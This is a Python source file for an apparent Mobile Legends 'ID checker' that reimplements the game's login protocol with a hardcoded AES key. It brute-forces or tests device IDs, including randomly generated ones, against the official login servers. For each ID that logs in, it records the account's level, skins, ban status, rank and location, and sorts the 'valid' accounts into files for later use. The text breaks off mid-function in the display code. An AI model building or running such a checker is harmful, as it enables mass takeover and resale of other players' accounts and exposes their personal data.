from __future__ import annotations
import datetime
import hashlib
import json
import logging
import os
import random
import readline
import socket
import struct
import sys
import time
import uuid
import zlib
import threading as _threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple, Union

try:
    import zstandard as zstd
except ImportError:
    print('[ERROR] zstandard not installed. Run: pip install zstandard')
    sys.exit(1)

try:
    from Crypto.Cipher import AES
except ImportError:
    print('[ERROR] pycryptodome not installed. Run: pip install pycryptodome')
    sys.exit(1)

try:
    from rich.console import Console, Group as RichGroup
    from rich.live import Live
    from rich.table import Table
    from rich.panel import Panel
    from rich.text import Text
    from rich.align import Align
    from rich.box import DOUBLE, HEAVY, ROUNDED, SIMPLE_HEAVY, MINIMAL, MINIMAL_HEAVY_HEAD
    from rich.theme import Theme
    from rich.markup import escape
    from rich.style import Style
    from rich.layout import Layout
    from rich.columns import Columns
    from rich.padding import Padding
    from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn, SpinnerColumn
except ImportError:
    print('[ERROR] rich not installed. Run: pip install rich')
    sys.exit(1)

try:
    import pyfiglet
    HAS_FIGLET = True
except ImportError:
    HAS_FIGLET = False

# History file setup
_HIST_FILE = os.path.join(os.path.expanduser('~'), '.mlbb_checker_history')
try:
    if os.path.exists(_HIST_FILE):
        readline.read_history_file(_HIST_FILE)
    readline.set_history_length(500)
except Exception:
    pass

def _save_history():
    try:
        readline.write_history_file(_HIST_FILE)
    except Exception:
        pass

# Enhanced Cyber Theme
CYBER_THEME = Theme({
    'cyber.border': 'bright_cyan',
    'cyber.title': 'bold bright_magenta',
    'cyber.success': 'bold bright_green',
    'cyber.fail': 'bold bright_red',
    'cyber.warn': 'bold bright_yellow',
    'cyber.info': 'bold bright_cyan',
    'cyber.dim': 'dim white',
    'cyber.speed': 'bold bright_yellow',
    'cyber.prompt': 'bold bright_cyan',
    'cyber.highlight': 'bold bright_white on grey15',
    'cyber.gold': 'bold bright_yellow',
    'cyber.purple': 'bold bright_magenta',
    'cyber.blue': 'bold bright_cyan',
    'cyber.green': 'bold bright_green',
    'cyber.red': 'bold bright_red',
    'cyber.orange': 'bold orange1',
    'cyber.pink': 'bold bright_magenta',
})

_HDR_STYLE = 'bold bright_cyan on grey11'
console = Console(theme=CYBER_THEME, width=120)
logging.basicConfig(level=logging.WARNING, format='%(asctime)s %(levelname)-7s %(message)s', datefmt='%H:%M:%S')

# Environment variable helpers
def _ei(n, d):
    try:
        return int(os.environ.get(n, d))
    except:
        return d

def _ef(n, d):
    try:
        return float(os.environ.get(n, d))
    except:
        return d

def _eb(n, d):
    r = os.environ.get(n)
    return r.strip().lower() in {'1', 'true', 'yes', 'on'} if r else d

# Configuration constants
LOGIN_HOST = os.environ.get('MLBB_LOGIN_HOST', 'login.ml.youngjoygame.com')
LOGIN_PORT = _ei('MLBB_LOGIN_PORT', 30021)
CLIENT_VERSION = os.environ.get('MLBB_CLIENT_VERSION', '2.1.88.1205.1')
CHANNEL = os.environ.get('MLBB_CHANNEL', 'and_usa')
LANGUAGE = os.environ.get('MLBB_LANG', 'en')
SOCKET_TIMEOUT = _ef('MLBB_SOCK_TIMEOUT', 1.5)
CONNECT_TIMEOUT = _ef('MLBB_CONNECT_TIMEOUT', 1.5)
TCP_NODELAY = _eb('MLBB_TCP_NODELAY', True)
RECV_CHUNK = 8192
_SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

# Hero ID mapping
HERO_ID_MAP: Dict[int, str] = {
    1: 'Miya', 2: 'Balmond', 3: 'Saber', 4: 'Alice', 5: 'Nana',
    6: 'Tigreal', 7: 'Alucard', 8: 'Karina', 9: 'Akai', 10: 'Franco',
    11: 'Bane', 12: 'Bruno', 13: 'Clint', 14: 'Rafaela', 15: 'Eudora',
    16: 'Zilong', 17: 'Fanny', 18: 'Layla', 19: 'Minotaur', 20: 'Lolita',
    21: 'Hayabusa', 22: 'Freya', 23: 'Gord', 24: 'Natalia', 25: 'Kagura',
    26: 'Chou', 27: 'Sun', 28: 'Alpha', 29: 'Ruby', 30: 'Yi Sun-shin',
    31: 'Moskov', 32: 'Johnson', 33: 'Cyclops', 34: 'Estes', 35: 'Hilda',
    36: 'Aurora', 37: 'Lapu-Lapu', 38: 'Vexana', 39: 'Roger', 40: 'Karrie',
    41: 'Gatotkaca', 42: 'Harley', 43: 'Irithel', 44: 'Grock', 45: 'Argus',
    46: 'Odette', 47: 'Lancelot', 48: 'Diggie', 49: 'Hylos', 50: 'Zhask',
    51: 'Helcurt', 52: 'Pharsa', 53: 'Lesley', 54: 'Jawhead', 55: 'Angela',
    56: 'Gusion', 57: 'Valir', 58: 'Martis', 59: 'Uranus', 60: 'Hanabi',
    61: "Chang'e", 62: 'Kaja', 63: 'Selena', 64: 'Aldous', 65: 'Claude',
    66: 'Vale', 67: 'Leomord', 68: 'Lunox', 69: 'Hanzo', 70: 'Belerick',
    71: 'Kimmy', 72: 'Thamuz', 73: 'Harith', 74: 'Minsitthar', 75: 'Kadita',
    76: 'Faramis', 77: 'Badang', 78: 'Khufra', 79: 'Granger', 80: 'Guinevere',
    81: 'Esmeralda', 82: 'Terizla', 83: 'X.Borg', 84: 'Ling', 85: 'Dyrroth',
    86: 'Lylia', 87: 'Baxia', 88: 'Masha', 89: 'Wanwan', 90: 'Silvanna',
    91: 'Cecilion', 92: 'Carmilla', 93: 'Atlas', 94: 'Popol and Kupa',
    95: 'Yu Zhong', 96: 'Luo Yi', 97: 'Benedetta', 98: 'Khaleed',
    99: 'Barats', 100: 'Brody', 101: 'Yve', 102: 'Mathilda', 103: 'Paquito',
    104: 'Gloo', 105: 'Beatrix', 106: 'Phoveus', 107: 'Natan', 108: 'Aulus',
    109: 'Aamon', 110: 'Valentina', 111: 'Edith', 112: 'Floryn', 113: 'Yin',
    114: 'Melissa', 115: 'Xavier', 116: 'Julian', 117: 'Fredrinn', 118: 'Joy',
    119: 'Novaria', 120: 'Arlott', 121: 'Ixia', 122: 'Nolan', 123: 'Cici',
    124: 'Chip', 125: 'Zhuxin', 126: 'Suyou', 127: 'Lukas', 128: 'Kalea',
    129: 'Zetian', 130: 'Obsidia'
}

def hero_name(hid: int) -> str:
    return HERO_ID_MAP.get(hid, f'Unknown({hid})')

# Rank definitions
RANK_DEFS = [
    (0, 4, 'Warrior III'), (5, 9, 'Warrior II'), (10, 14, 'Warrior I'),
    (15, 19, 'Elite IV'), (20, 24, 'Elite III'), (25, 29, 'Elite II'),
    (30, 34, 'Elite I'), (35, 39, 'Master IV'), (40, 44, 'Master III'),
    (45, 49, 'Master II'), (50, 54, 'Master I'), (55, 59, 'Grandmaster IV'),
    (60, 64, 'Grandmaster III'), (65, 69, 'Grandmaster II'), (70, 74, 'Grandmaster I'),
    (75, 81, 'Epic IV'), (82, 88, 'Epic III'), (89, 95, 'Epic II'),
    (96, 107, 'Epic I'), (108, 114, 'Legend IV'), (115, 121, 'Legend III'),
    (122, 128, 'Legend II'), (129, 135, 'Legend I'),
    (136, 160, lambda p: f'Mythic {p - 135}'),
    (161, 195, lambda p: f'Mythical Honor {p - 135}'),
    (196, 235, lambda p: f'Mythical Glory {p - 157}'),
    (236, 999, lambda p: f'Mythical Immortal {p - 157}')
]

def map_rank(p: int) -> str:
    for mn, mx, r in RANK_DEFS:
        if mn <= p <= mx:
            return r(p) if callable(r) else r
    return 'Unknown'

COLLECTOR_TIERS = [
    (0, 'None'), (1, 'Collector I'), (100, 'Collector II'),
    (300, 'Collector III'), (600, 'Collector IV'), (1000, 'Collector V'),
    (2000, 'Collector VI'), (5000, 'Collector VII')
]

def map_collector(pts: int) -> str:
    t = 'None'
    for th, lb in COLLECTOR_TIERS:
        if pts >= th:
            t = lb
    return t

_AFFINITY = {0: 'None', 1: 'Bronze', 2: 'Silver', 3: 'Gold', 4: 'Platinum', 5: 'Diamond'}
_SKIN_LBL = {6: 'Supreme', 5: 'Grand', 4: 'Exquisite', 3: 'Deluxe', 2: 'Exceptional', 1: 'Common'}
_BAN_CODES = {1: 'Banned(perm)', 2: 'Banned(temp)', 3: 'Banned', 4: 'Suspended', 5: 'Restricted'}

def fmt_ts(ts: int) -> str:
    if not ts:
        return 'Never'
    try:
        return datetime.datetime.fromtimestamp(int(ts), tz=datetime.timezone.utc).strftime('%Y-%m-%d %H:%M UTC')
    except:
        return str(ts)

# AES encryption constants
AES_KEY = bytes.fromhex('f5a193d50ade553e9835595f5cd75ddd')
AES_IV = b'\x00' * 16

def aes_decrypt(data: bytes) -> bytes:
    c = AES.new(AES_KEY, AES.MODE_CBC, iv=AES_IV)
    return c.decrypt(data[:-1] if len(data) % 16 != 0 else data)

# SDP Protocol classes
class SdpDataType(Enum):
    INTEGER_POSITIVE = 0
    INTEGER_NEGATIVE = 1
    FLOAT = 2
    DOUBLE = 3
    STRING = 4
    LIST = 5
    DICT = 6
    STRUCT_BEGIN = 7
    STRUCT_END = 8

class SdpException(Exception):
    pass

class SdpStruct(dict):
    def __init__(self, data: Any=None):
        super().__init__()
        self.data = b''
        self.offset = 0
        if isinstance(data, bytes):
            self.data = data
            self._unpack_bin()
        elif data is not None:
            super().update(data)
            self._pack_bin()

    def _pack_bin(self):
        self.data = bytes([SdpDataType.STRUCT_BEGIN.value << 4])
        for t, v in sorted(self.items()):
            self._pk(t, v)
        self.data += bytes([SdpDataType.STRUCT_END.value << 4])

    def _wn(self, v: int) -> bytes:
        r = bytearray()
        while v >= 128:
            r.append(v & 127 | 128)
            v >>= 7
        r.append(v & 127)
        return bytes(r)

    def _ph(self, tag: int, dt: SdpDataType):
        if tag < 15:
            self.data += bytes([dt.value << 4 | tag])
        else:
            self.data += bytes([dt.value << 4 | 15])
            self.data += self._wn(tag)

    def _pk(self, tag: int, value: Any):
        if isinstance(value, bool):
            self._ph(tag, SdpDataType.INTEGER_POSITIVE)
            self.data += self._wn(1 if value else 0)
        elif isinstance(value, int):
            if value < 0:
                self._ph(tag, SdpDataType.INTEGER_NEGATIVE)
                self.data += self._wn(-value)
            else:
                self._ph(tag, SdpDataType.INTEGER_POSITIVE)
                self.data += self._wn(value)
        elif isinstance(value, float):
            self._ph(tag, SdpDataType.DOUBLE)
            p = struct.pack('<d', value)
            self.data += self._wn(len(p))
            self.data += p
        elif isinstance(value, (str, bytes)):
            self._ph(tag, SdpDataType.STRING)
            e = value.encode() if isinstance(value, str) else value
            self.data += self._wn(len(e))
            self.data += e
        elif isinstance(value, list):
            self._ph(tag, SdpDataType.LIST)
            self.data += self._wn(len(value))
            for i in value:
                self._pk(0, i)
        elif isinstance(value, dict):
            if isinstance(value, SdpStruct):
                self._ph(tag, SdpDataType.STRUCT_BEGIN)
                for k, v in sorted(value.items()):
                    self._pk(k, v)
                self.data += bytes([SdpDataType.STRUCT_END.value << 4])
            else:
                self._ph(tag, SdpDataType.DICT)
                self.data += self._wn(len(value))
                for k, v in sorted(value.items()):
                    self._pk(0, k)
                    self._pk(0, v)
        else:
            raise SdpException(f'bad type {type(value)}')

    def _unpack_bin(self):
        if not self.data:
            return
        if self.data[0] >> 4 == SdpDataType.STRUCT_BEGIN.value:
            self.offset = 1
        while self.offset < len(self.data):
            t, v = self._up()
            if isinstance(v, SdpDataType) and v == SdpDataType.STRUCT_END:
                break
            self[t] = v

    def _rn(self) -> int:
        n = 1
        val = self.data[self.offset] & 127
        while self.data[self.offset + n - 1] >= 128:
            val |= (self.data[self.offset + n] & 127) << 7 * n
            n += 1
        self.offset += n
        return val

    def _up(self) -> Tuple[int, Any]:
        try:
            if self.offset >= len(self.data):
                return (0, None)
            h = self.data[self.offset]
            tag = h & 15
            dt = SdpDataType(h >> 4)
            self.offset += 1
            if tag == 15:
                tag = self._rn()
            
            if dt == SdpDataType.INTEGER_POSITIVE:
                return (tag, self._rn())
            if dt == SdpDataType.INTEGER_NEGATIVE:
                return (tag, -self._rn())
            if dt == SdpDataType.FLOAT:
                return (tag, struct.unpack('<f', self._rn().to_bytes(4, 'little'))[0])
            if dt == SdpDataType.DOUBLE:
                return (tag, struct.unpack('<d', self._rn().to_bytes(8, 'little'))[0])
            if dt == SdpDataType.STRING:
                ln = self._rn()
                try:
                    v = self.data[self.offset:self.offset + ln].decode()
                except:
                    v = self.data[self.offset:self.offset + ln]
                self.offset += ln
                return (tag, v)
            if dt == SdpDataType.LIST:
                ln = self._rn()
                items = []
                for _ in range(ln):
                    _, i = self._up()
                    items.append(i)
                return (tag, items)
            if dt == SdpDataType.DICT:
                ln = self._rn()
                d = {}
                for _ in range(ln):
                    _, k = self._up()
                    _, v = self._up()
                    d[k] = v
                return (tag, d)
            if dt == SdpDataType.STRUCT_BEGIN:
                sub = {}
                while True:
                    st, sv = self._up()
                    if isinstance(sv, SdpDataType) and sv == SdpDataType.STRUCT_END:
                        break
                    sub[st] = sv
                return (tag, SdpStruct(sub))
            if dt == SdpDataType.STRUCT_END:
                return (tag, SdpDataType.STRUCT_END)
        except:
            raise SdpException('unpack error')

    def copy(self):
        return SdpStruct(super().copy())

    def update(self, o):
        super().update(o)
        self._pack_bin()

def _frame(pid: int, seq: int, payload: bytes) -> bytes:
    pkt = SdpStruct({0: pid, 1: seq, 5: payload}).data
    buf = zstd.compress(pkt)
    return (len(buf) + 4 | 16 << 24).to_bytes(4, 'big') + buf

def _decode(ct: int, data: bytes) -> bytes:
    if ct == 1:
        return zlib.decompress(data)
    if ct == 16:
        return zstd.decompress(data)
    if ct == 2:
        return aes_decrypt(data).rstrip(b'\x00')
    if ct == 3:
        return zlib.decompress(aes_decrypt(data).rstrip(b'\x00'))
    if ct == 18:
        return zstd.decompress(aes_decrypt(data).rstrip(b'\x00'))
    return data

# Connection classes
class BaseConnection:
    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port
        self.sequence = 1
        self.socket: Optional[socket.socket] = None
        self.queue_data = b''

    def connect(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if TCP_NODELAY:
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.settimeout(CONNECT_TIMEOUT)
        s.connect((self.host, self.port))
        s.settimeout(SOCKET_TIMEOUT)
        self.socket = s

    def cleanup(self):
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
            self.socket = None
            self.sequence = 1
            self.queue_data = b''

    def send_data(self, pid: int, sdp: SdpStruct):
        self.socket.send(_frame(pid, self.sequence, sdp.data))
        self.sequence += 1

    def recv_data(self) -> Tuple[Optional[int], Optional[SdpStruct]]:
        try:
            while len(self.queue_data) < 4:
                d = self.socket.recv(RECV_CHUNK)
                if not d:
                    return (None, None)
                self.queue_data += d
            flags = int.from_bytes(self.queue_data[:4], 'big')
            size = flags & 16777215
            ct = flags >> 24
            while len(self.queue_data) < size:
                d = self.socket.recv(RECV_CHUNK)
                if not d:
                    return (None, None)
                self.queue_data += d
            data = self.queue_data[4:size]
            self.queue_data = self.queue_data[size:]
            data = _decode(ct, data)
            r = SdpStruct(data)
            pid = r[0]
            if pid is None:
                return (None, None)
            res = r.get(6) or r.get(5)
            if not res or not isinstance(res, bytes):
                return (pid, None)
            return (pid, SdpStruct(res))
        except socket.timeout:
            return (-1, None)
        except:
            return (None, None)

class GameConnection(BaseConnection):
    def __init__(self, device_id: str, device_model: Optional[str]=None):
        super().__init__(LOGIN_HOST, LOGIN_PORT)
        self.device_id = device_id
        self.device_model = device_model or 'Xiaomi:Redmi Note 12'
        self.imei_md5, self.android_id, self.advertising_id = self._parse(device_id)
        self.channel = CHANNEL
        self.client_version = CLIENT_VERSION
        self.account_id = 0
        self.session_key = ''
        self.zone_id = 0
        self.game_server_host = ''
        self.game_server_port = 0
        self.ban_status = 'Unknown'
        self.ban_end_ts = 0

    @staticmethod
    def _parse(did: str) -> Tuple[str, str, str]:
        parts = did.split('_')
        if len(parts) >= 2:
            info = parts[1]
            if len(parts) >= 3 and len(info) < 32:
                info += '_' + parts[2]
            if len(info) >= 32:
                imei = info[:32]
                android = info[32:48] if len(info) >= 48 else ''
                adv = info[48:] if len(info) > 48 else ''
            else:
                imei = info
                android = ''
                adv = ''
        else:
            imei = did
            android = ''
            adv = ''
        return (imei, android, adv)

    def login_to_login_server(self) -> bool:
        self.send_data(1, SdpStruct({
            0: self.device_id,
            1: f'gps_adid={self.advertising_id}&android_id={self.android_id}&device_unique_id={self.imei_md5}',
            2: self.client_version,
            3: self.channel,
            4: LANGUAGE
        }))
        pid, res = self.recv_data()
        if pid == 2 and res:
            self.account_id = res.get(0)
            self.session_key = res[1]
            self.zone_id = res[2][0]
            err = res.get(10, 0)
            if err in (3, 4, 5, 6, 100, 101, 102):
                self.ban_status = 'BANNED'
                self.ban_end_ts = res.get(20, 0)
            return True
        return False

    def get_game_server(self) -> bool:
        self.send_data(5, SdpStruct({
            0: self.account_id,
            1: self.session_key,
            2: self.client_version,
            5: self.zone_id,
            6: self.channel
        }))
        pid, res = self.recv_data()
        if pid == 6 and res:
            self.game_server_host, port = res[1].split(':')
            self.game_server_port = int(port)
            return True
        return False

    def connect_to_game_server(self) -> bool:
        self.cleanup()
        self.host = self.game_server_host
        self.port = self.game_server_port
        self.connect()
        self.send_data(10001, SdpStruct({
            0: self.account_id,
            1: self.session_key,
            2: self.zone_id,
            4: self.client_version,
            13: self.channel,
            15: self.device_id
        }))
        self.send_data(10101, SdpStruct({0: 0, 2: 2}))
        for _ in range(20):
            pid, _ = self.recv_data()
            if pid is None or pid == -1:
                return False
            if pid == 10002:
                return True
            if pid not in (20001,):
                return False
        return False

    def _filter_by_server(self, result, target):
        if not result or not result.get(0):
            return None
        for p in result[0]:
            if isinstance(p, dict) and p.get(1) == target:
                return SdpStruct({0: [p]})
        return None

    def lookup_player(self, search_value: Any, search_type: str='id', server_filter: Optional[int]=None) -> Optional[SdpStruct]:
        ldata = SdpStruct({1: int(search_value)}) if search_type == 'id' else SdpStruct({0: str(search_value).strip()})
        self.send_data(11153, ldata)
        cnt = 0
        while True:
            pid, res = self.recv_data()
            if pid is None or pid == -1:
                return None
            if pid == 11154:
                if search_type == 'nickname' and server_filter is not None:
                    return self._filter_by_server(res, server_filter)
                return res
            if pid == 20001:
                cnt += 1
                if cnt >= 5:
                    return None

def extract_player_data(result: Any) -> Optional[Dict[str, Any]]:
    if not result or not result[0] or len(result[0]) == 0:
        return None
    try:
        pd = result[0][0]
        nickname = pd.get(2, 'Unknown')
        player_id = pd.get(0, 'Unknown')
        server = pd.get(1, 'Unknown')
        level = pd.get(3, 'Unknown')
        bc = pd.get(39, pd.get(40, 0))
        bet = pd.get(41, 0)
        
        if isinstance(bc, int) and bc in _BAN_CODES:
            ban_status = _BAN_CODES[bc]
        elif isinstance(bc, int) and bc > 0:
            ban_status = f'Banned(code {bc})'
        else:
            ban_status = 'Not Banned'
        
        ban_end = fmt_ts(bet) if bet else 'N/A'
        skin_count = pd.get(83, 0)
        try:
            skin_count = int(skin_count)
        except:
            skin_count = 0
        
        last_login = fmt_ts(pd.get(5, 0))
        llc = pd.get(87, 'Unknown')
        hero_count = pd.get(4, 0)
        win = pd.get(18, 0)
        loss = pd.get(155, 0)
        total = win + loss
        wr = f'{win / total * 100:.2f}%' if total > 0 else 'N/A'
        
        loc = 'NOT FOUND'
        ld = pd.get(71)
        if ld and isinstance(ld, list) and (len(ld) >= 2):
            loc = ', '.join((str(x) for x in ld))
        
        sn = str(pd.get(30, '')).replace('`', '').strip()
        si = str(pd.get(31, ''))
        squad = f'{si} {sn}'.strip() if sn else '—'
        sqid = pd.get(34, pd.get(28, 0))
        squad_id = f'Squad ID: {sqid}' if sqid else 'N/A'
        
        hr = map_rank(pd.get(95)) if pd.get(95) is not None else 'Unknown'
        cr = map_rank(pd.get(8)) if pd.get(8) is not None else 'Unknown'
        
        t136 = pd.get(136, {})
        cpt = t136.get(9, 0) if isinstance(t136, dict) else 0
        ctier = map_collector(cpt)
        
        aff_lv = (pd.get(135, {}) or {}).get(1, 0)
        affinity = _AFFINITY.get(aff_lv, f'Lv{aff_lv}') if aff_lv else 'None'
        cac = pd.get(97, 'Unknown')
        
        t91 = pd.get(91, [])
        lmh = hero_name(t91[0]) if isinstance(t91, list) and t91 else None
        prev: List[str] = []
        if isinstance(t91, list) and len(t91) > 1:
            seen: set = set()
            for hid in t91[1:]:
                if hid not in seen:
                    seen.add(hid)
                    prev.append(hero_name(hid))
                if len(prev) >= 5:
                    break
        
        lm = {'hero_name': lmh, 'prev': prev} if lmh else None
        
        return {
            'nickname': nickname,
            'player_id': player_id,
            'server': server,
            'level': level,
            'ban_status': ban_status,
            'ban_end': ban_end,
            'skin_count': skin_count,
            'last_login': last_login,
            'last_login_country': llc,
            'create_country': cac,
            'hero_count': hero_count,
            'location': loc,
            'high_rank': hr,
            'current_rank': cr,
            'collector_tier': ctier,
            'squad': squad,
            'squad_id': squad_id,
            'affinity': affinity,
            'total_battles': total,
            'win_rate': wr,
            'last_match': lm
        }
    except Exception as e:
        logging.debug(f"Parse error: {e}")
        return None

def check_device_id(device_id: str) -> Dict[str, Any]:
    device_id = device_id.strip()
    if not device_id or len(device_id) < 10:
        return {'status': 'error', 'device_id': device_id, 'error': 'ID too short'}
    
    conn: Optional[GameConnection] = None
    try:
        conn = GameConnection(device_id)
        conn.connect()
        
        if not conn.login_to_login_server():
            conn.cleanup()
            return {'status': 'error', 'device_id': device_id, 'error': 'Login failed'}
        
        aid = conn.account_id
        bfl = conn.ban_status
        bel = conn.ban_end_ts
        
        if not aid:
            conn.cleanup()
            return {'status': 'error', 'device_id': device_id, 'error': 'No account linked'}
        
        if not conn.get_game_server():
            conn.cleanup()
            return {'status': 'error', 'device_id': device_id, 'error': 'Server resolve failed'}
        
        if not conn.connect_to_game_server():
            conn.cleanup()
            return {'status': 'error', 'device_id': device_id, 'error': 'Handshake failed'}
        
        result = conn.lookup_player(aid, search_type='id')
        conn.cleanup()
        
        if not result:
            return {'status': 'error', 'device_id': device_id, 'error': 'Lookup returned no data'}
        
        player = extract_player_data(result)
        if not player:
            return {'status': 'error', 'device_id': device_id, 'error': 'Parse failed'}
        
        if bfl and bfl != 'Unknown' and (player.get('ban_status') == 'Not Banned'):
            player['ban_status'] = bfl
            player['ban_end'] = fmt_ts(bel) if bel else 'N/A'
        
        return {'status': 'success', 'device_id': device_id, 'player_data': player}
    except Exception as exc:
        if conn:
            try:
                conn.cleanup()
            except:
                pass
        return {'status': 'error', 'device_id': device_id, 'error': str(exc)}

# File management
LEVEL_BRACKETS = [
    (9, 30, 'level_9-30.txt'),
    (31, 50, 'level_31-50.txt'),
    (51, 100, 'level_51-100.txt'),
    (101, 200, 'level_101-200.txt'),
    (201, 9999, 'level_200plus.txt')
]

SKIN_BRACKETS = [
    (20, 50, 'skin_20-50.txt'),
    (51, 100, 'skin_51-100.txt'),
    (101, 200, 'skin_101-200.txt'),
    (201, 300, 'skin_201-300.txt'),
    (301, 400, 'skin_301-400.txt'),
    (401, 9999, 'skin_401-700plus.txt')
]

def _setup_folders(base: str) -> Tuple[str, str, str]:
    lv = os.path.join(base, 'levels')
    sk = os.path.join(base, 'skins')
    os.makedirs(lv, exist_ok=True)
    os.makedirs(sk, exist_ok=True)
    return (lv, sk, os.path.join(base, 'all_valid.txt'))

def _lv_file(lv_dir: str, lvl: int) -> Optional[str]:
    for mn, mx, fn in LEVEL_BRACKETS:
        if mn <= lvl <= mx:
            return os.path.join(lv_dir, fn)
    return None

def _sk_file(sk_dir: str, skin: int) -> Optional[str]:
    for mn, mx, fn in SKIN_BRACKETS:
        if mn <= skin <= mx:
            return os.path.join(sk_dir, fn)
    return None

def _save_line(did: str, p: Dict[str, Any]) -> str:
    lm = p.get('last_match') or {}
    lh = lm.get('hero_name', 'N/A')
    ban = p.get('ban_status', 'N/A')
    be = p.get('ban_end', 'N/A')
    ban_f = f'{ban}(ends:{be})' if ('Banned' in ban or 'Suspended' in ban) and be != 'N/A' else ban
    return f"Device ID: {did} | Name: {p.get('nickname', 'N/A')} | Role ID: {p.get('player_id', 'N/A')} | Server ID: {p.get('server', 'N/A')} | Level: {p.get('level', 'N/A')} | Ban: {ban_f} | Skin: {p.get('skin_count', 'N/A')} | Last Login: {p.get('last_login', 'N/A')} | Country: {p.get('last_login_country', 'N/A')} | Rank: {p.get('current_rank', 'N/A')} | High Rank: {p.get('high_rank', 'N/A')} | Win Rate: {p.get('win_rate', 'N/A')} | Heroes: {p.get('hero_count', 0)} | Matches: {p.get('total_battles', 0)} | Last Hero: {lh} | Squad: {p.get('squad', '—')} | Collector: {p.get('collector_tier', 'None')} | Reg: {p.get('create_country', 'N/A')}"

def _read_ids(path: str) -> List[str]:
    ids = []
    with open(path, encoding='utf-8', errors='ignore') as f:
        for line in f:
            r = line.strip()
            if r and (not r.startswith('#')):
                ids.append(r)
    return ids

def generate_device_ids(count: int) -> List[str]:
    ids = []
    for _ in range(count):
        imei = ''.join((str(random.randint(0, 9)) for _ in range(15)))
        md5 = hashlib.md5(imei.encode()).hexdigest()
        aid = '%016x' % random.getrandbits(64)
        adv = str(uuid.UUID(int=random.getrandbits(128)))
        ids.append(f'and_{md5}{aid}{adv}')
    return ids

# ==================== ENHANCED UI COMPONENTS ====================

def _make_banner() -> Panel:
    """Create an epic cyber banner"""
    # Main title with figlet
    if HAS_FIGLET:
        try:
            art = pyfiglet.figlet_format('MLBB', font='doom').rstrip('\n')
            art2 = pyfiglet.figlet_format('CHECKER', font='small').rstrip('\n')
            full_art = art + '\n' + art2
        except:
            full_art = '  ███╗   ███╗██╗     ██████╗ ██████╗ \n  ████╗ ████║██║     ██╔══██╗██╔══██╗\n  ██╔████╔██║██║     ██████╔╝██████╔╝\n  ██║╚██╔╝██║██║     ██╔══██╗██╔══██╗\n  ██║ ╚═╝ ██║███████╗██████╔╝██████╔╝\n  ╚═╝     ╚═╝╚══════╝╚═════╝ ╚═════╝'
    else:
        full_art = '  MLBB ID CHECKER  ◈  CYBER EDITION'
    
    # Cyber badge
    badge = Text(justify='center')
    badge.append('  ⚡ ', 'bright_yellow')
    badge.append('CYBER SCANNER', 'bold bright_magenta')
    badge.append(' ⚡  ', 'bright_yellow')
    badge.append('v3.0', 'bright_cyan')
    badge.append('  ◈  ', 'dim')
    badge.append('DEVELOPED BY', 'dim')
    badge.append(' [bright_cyan]CYBER[/]', 'bold bright_white')
    
    # Subtitle
    sub = Text('  ⟐  Real-time Device ID Scanner  ⟐  Level/Skin Sorter  ⟐  ', justify='center', style='dim cyan')
    
    # Main art panel
    art_panel = Panel(
        Align.center(Text(full_art, style='bold bright_cyan', justify='center')),
        box=HEAVY,
        border_style='bright_magenta',
        padding=(0, 2)
    )
    
    # Combine everything
    content = RichGroup(
        art_panel,
        Text(''),
        Align.center(badge),
        Text(''),
        Align.center(sub),
        Text('')
    )
    
    return Panel(
        content,
        box=DOUBLE,
        border_style='bright_cyan',
        title='[bold bright_magenta]◇  MLBB ID CHECKER  ◇[/]',
        subtitle='[dim cyan]━━━  Cyber Edition  ━━━[/]',
        padding=(1, 3)
    )

def _cyber_input(label: str, default: str='') -> str:
    """Styled input with cyber theme"""
    hint = f' \x1b[2m[{default}]\x1b[0m' if default else ''
    try:
        # Create a beautiful input prompt
        prompt = Text()
        prompt.append('  ⟫ ', 'bright_cyan')
        prompt.append(label, 'bold bright_white')
        prompt.append(hint, 'dim')
        prompt.append(' : ', 'bright_cyan')
        
        console.print(prompt, end='')
        raw = input().strip()
        return raw if raw else default
    except (EOFError, KeyboardInterrupt):
        return default

def _cyber_int(label: str, default: int=15, lo: int=1, hi: int=500) -> int:
    while True:
        raw = _cyber_input(label, str(default))
        try:
            v = int(raw)
            if lo <= v <= hi:
                return v
            console.print(f'[bright_yellow]  ⚠ Please enter a number between {lo} and {hi}[/]')
        except ValueError:
            console.print('[bright_red]  ✘ Invalid number[/]')

def _create_progress_bar(current: int, total: int, width: int = 40) -> Text:
    """Create a beautiful animated progress bar"""
    pct = (current / total * 100) if total > 0 else 0
    filled = int(width * pct / 100)
    
    bar = Text()
    bar.append('█' * filled, 'bright_green')
    bar.append('░' * (width - filled), 'dim')
    bar.append(f'  {pct:5.1f}%', 'bold bright_white')
    
    return bar

def _stats_panel(stats: Dict[str, Any]) -> Panel:
    """Enhanced stats panel with beautiful layout"""
    total = max(stats['total'], 1)
    checked = stats['checked']
    elapsed = max(stats['elapsed'], 0.001)
    pct = checked / total * 100
    cpm = int(checked / elapsed * 60)
    spd = checked / elapsed
    
    # Progress bar
    progress = _create_progress_bar(checked, total, 50)
    
    # Speed indicators
    speed_row = Table(show_header=False, box=None, padding=(0, 2))
    speed_row.add_column(style='bright_cyan', width=15)
    speed_row.add_column(style='bold bright_white', width=12)
    speed_row.add_column(style='bright_cyan', width=15)
    speed_row.add_column(style='bold bright_white', width=12)
    
    speed_row.add_row(
        '⚡ Speed:', f'{spd:.1f}/s',
        '🔥 CPM:', f'{cpm}'
    )
    
    # Middle section: Statistics
    mid_table = Table(show_header=True, box=MINIMAL_HEAVY_HEAD, header_style='bold bright_magenta on grey11', padding=(0, 2))
    mid_table.add_column('📊 STATS', style='bold bright_cyan', width=12)
    mid_table.add_column('Value', style='bold bright_white', width=12)
    mid_table.add_column('📊 STATS', style='bold bright_cyan', width=12)
    mid_table.add_column('Value', style='bold bright_white', width=12)
    
    mid_table.add_row(
        '✅ Valid', f'[bright_green]{stats["valid"]}[/]',
        '❌ Invalid', f'[bright_red]{stats["not_valid"]}[/]'
    )
    mid_table.add_row(
        '⏳ Checked', f'[bright_cyan]{checked}[/]',
        '⏹ Remaining', f'[bright_white]{total - checked}[/]'
    )
    mid_table.add_row(
        '📂 Filtered', f'[bright_yellow]{stats["filtered"]}[/]',
        '🧵 Threads', f'[bright_magenta]{stats["threads"]}[/]'
    )
    mid_table.add_row(
